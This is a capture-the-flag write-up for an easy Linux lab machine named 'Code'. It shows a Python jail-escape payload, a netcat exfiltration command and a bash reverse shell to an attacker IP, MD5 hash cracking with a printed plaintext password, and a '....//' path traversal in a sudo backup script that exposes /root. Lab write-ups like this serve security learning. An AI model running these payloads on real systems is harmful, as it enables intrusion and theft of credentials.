<h1>CODE WRITE UP</h1>

<img width="697" height="378" alt="code" src="https://github.com/user-attachments/assets/544ce1ca-2ccf-4060-b59c-7f939f82ae3e" /><br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Easy<br>
<b>Operating System:</b> Linux<br>
<b>IP Address:</b> 10.10.11.62<br>
<b>Hostname:</b> None<br>
<b>Open Ports:</b> 22/tcp, 5000/tcp<br>
<b>Web Server:</b> Gunicorn v20.0.4<br>
<b>Addition:</b> Python, Backy<br>

<h2>SUMMARY</h2>

Code is an easy Linux machine featuring a Python Code Editor web application vulnerable to remote code execution through a Python Jail Bypass. After gaining access as the "app-production" user, I find crackable credentials in an SQLite3 database. Using these credentials, I gain access as the "martin" user, who has sudo permissions to execute a backup utility script called "backy.sh". This script contains a vulnerable section that can be exploited to create a backup copy of the "/root" directory, allowing me to retrieve the root flag.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan.

<code>nmap -sC -sV 10.10.11.62</code>

Result:

<img width="768" height="298" alt="ss1" src="https://github.com/user-attachments/assets/6503ee34-63ad-4b6d-81a5-6916f58123ee" /><br>

As I can see, ports 22(SSH) and 5000(HTTP) are open.

<b>2-</b> Visit "10.10.11.62:5000".

<img width="1366" height="688" alt="ss2" src="https://github.com/user-attachments/assets/ee1fd3cf-a312-43f3-882d-7b550efbb66d" /><br>

A Python code editor application welcomes me.

<b>3-</b> I immediately try to import a module such as "os".

<img width="1366" height="225" alt="ss3" src="https://github.com/user-attachments/assets/ce5fc537-aba6-4a6e-ba08-6330004d5178" /><br>

As I can see, the system has a filter mechanism for imported modules.

<b>4-</b> So I start researching how to bypass this filter mechanism and find the "Python Jail Bypass" technique. To understand the technique, I use this <a href="https://anee.me/escaping-python-jails-849c65cf306e">page</a>.

<b>5-</b> When I try the payload from the article, the system gives me the same error.

<img width="1366" height="222" alt="ss4" src="https://github.com/user-attachments/assets/10559baa-fecc-4e1d-8152-9733ab4752da" /><br>

I also try this payload for importing the "os" module, but again I hit the filter mechanism.

<b>6-</b> So I continue searching for a suitable payload for my situation. I find this <a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d">page</a>.

<b>7-</b> After reading the article, I use this payload.

<code>[w for w in 1..class.base.subclasses() if w.name=='Quitter'][0].init.globals['sy'+'s'].modules['o'+'s'].dict'sy'+'stem'</code>

As a result, there is no output, but there is also no error. This means the bypass is working, but it is not providing any visible output.

<b>8-</b> According to this information, I prepare a new payload.

<code>[w for w in 1..class.base.subclasses() if w.name=='Quitter'][0].init.globals['sy'+'s'].modules['o'+'s'].dict['sy'+'stem']('whoami | nc 10.10.14.142 8282')</code>

Then I start listening on my system.

<code>nc -lvnp 8282</code>

Result:

<img width="499" height="71" alt="ss5" src="https://github.com/user-attachments/assets/31d25088-9677-4357-9e06-508e86cc245f" /><br>

And it works!

<b>9-</b> Now I just need to send a reverse shell to my system.

<code>[w for w in 1..class.base.subclasses() if w.name=='Quitter'][0].init.globals['sy'+'s'].modules['o'+'s'].dict['sy'+'stem']('bash -c "bash -i >& /dev/tcp/10.10.14.142/8282 0>&1"')</code>

Result:

<img width="650" height="264" alt="ss6" src="https://github.com/user-attachments/assets/d91a1064-65a8-4970-a0ea-e8ec72cec40e" /><br>

I got the shell.

<b>10-</b> When I go one level back in the directory, I find "user.txt".

<img width="273" height="116" alt="ss7" src="https://github.com/user-attachments/assets/69ec3431-1c90-4ca4-83e7-238246e642e7" /><br>

This is how I get the user flag!

<b>11-</b> I find the "database.db" file in the "/home/app-production/app/instance" path.

<code>file database.db</code>

Result:

<img width="613" height="50" alt="ss8" src="https://github.com/user-attachments/assets/a750ca6c-9529-4697-93b9-fd699ed8fedc" /><br>

As I can see, the file type is SQLite3.

<b>12-</b> I use the "sqlite3" command to look inside the database file.

<code>sqlite3 database.db</code>

<code>.tables</code>

Result:

<img width="459" height="64" alt="ss9" src="https://github.com/user-attachments/assets/85a9a11a-90a7-4e04-857c-bec2ca3dd633" /><br>

There are only two tables here. The "user" table is my target.

<b>13-</b> So I get all the data from the "user" table.

<code>SELECT * FROM user</code>

Result:

<img width="383" height="57" alt="ss10" src="https://github.com/user-attachments/assets/5e485be3-c691-4d18-9a6e-153fb67f0763" /><br>

There are two user records. I get their passwords as MD5 hashes.

<b>14-</b> I use "crackstation.net" to crack the password hashes.

Result for the "development" user:

<img width="1001" height="55" alt="ss11" src="https://github.com/user-attachments/assets/faad57e4-9390-4854-870f-ab21e687d660" /><br>

Result for the "martin" user:

<img width="1005" height="57" alt="ss12" src="https://github.com/user-attachments/assets/f8fc4835-8487-4320-bfc0-4ef1077e0de6" /><br>

I use Martin's credentials to establish an SSH connection.

<code>username: martin
password: nafeelswordsmaster</code>

<b>15-</b> Start an SSH connection as "martin".

<code>ssh martin@10.10.11.62</code>

Result:

<img width="851" height="569" alt="ss13" src="https://github.com/user-attachments/assets/3ac37b37-ce3c-491c-91b0-c8af030ab942" /><br>

I can establish an SSH connection.

<b>16-</b> I look for sudo permissions for the "martin" user.

<code>sudo -l</code>

Result:

<img width="954" height="98" alt="ss14" src="https://github.com/user-attachments/assets/3fa1cae6-c621-4d54-ad12-cdcc3d3fc18a" /><br>

I can execute "backy.sh" with sudo permissions.

<b>17-</b> When I look at the source code for "backy.sh", I notice that the script uses two filter mechanisms.

<code>cat /usr/bin/backy.sh</code>

The first mechanism is:

<img width="271" height="39" alt="ss15" src="https://github.com/user-attachments/assets/450217d9-3bc6-4b01-b46e-3a1b2c7636ad" /><br>

There is a whitelist for directories that can be archived.

The second mechanism is:

<img width="770" height="32" alt="ss16" src="https://github.com/user-attachments/assets/3b66435b-077d-43d9-8d24-a7c11ad8c760" /><br>

There is sanitization for "../". Therefore, if I use "....//", the code only removes the "../" part from the middle of the payload.

<b>18-</b> "backy.sh" uses "task.json" for its configuration. In "/home/martin/backups/" there is already an archived file and a "task.json" file. When I look at "task.json":

<code>cat task.json</code>

Result:

<img width="390" height="215" alt="ss17" src="https://github.com/user-attachments/assets/32acc8ec-1a85-4d1c-a088-cc1beadab845" /><br>

There is a "directories_to_archive" section used to specify which directories will be archived.

<b>19-</b> I prepare my own configuration file as "fnwn_task.json".

<code>cp task.json fnwn_task.json</code>

I make some changes to the configuration file.

Result:

<img width="392" height="135" alt="ss18" src="https://github.com/user-attachments/assets/69d96c2c-5dea-409b-be5c-82f9268204a8" /><br>

I remove the "exclude" section and modify "directories_to_archive" to use my payload: "/home/....//root/".

<b>20-</b> I run the script with my configuration file.

<code>sudo /usr/bin/backy.sh fnwn_task.json</code>

Result:

<img width="494" height="114" alt="ss19" src="https://github.com/user-attachments/assets/abb4f62e-ae1f-4380-a95e-127267391749" /><br>

The script works without an error.

<b>21-</b> I get a file named "code_home_.._root_2025_April.tar.bz2". I extract the files.

<code>tar -xvf code_home_.._root_2025_April.tar.bz2</code>

Result:

<img width="567" height="383" alt="ss20" src="https://github.com/user-attachments/assets/f85a301f-fcc9-4430-ac8c-ac3f8ef51764" /><br>

<b>22-</b> Now I just need to go to the extracted "/root" directory.

<code>cd ~/backup/root</code>

Result:

<img width="340" height="48" alt="ss21" src="https://github.com/user-attachments/assets/0cc0b4ce-6c4c-4933-9538-3ef14a5be5b0" /><br>

And this is how I get the root flag!

<h2>RESOURCE</h2> <ul> <li><a href="https://anee.me/escaping-python-jails-849c65cf306e">PYTHON JAIL BYPASS EXPLANATION</a></li> <li><a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d">PYTHON JAIL BYPASS PAYLOAD</a></li> </ul>
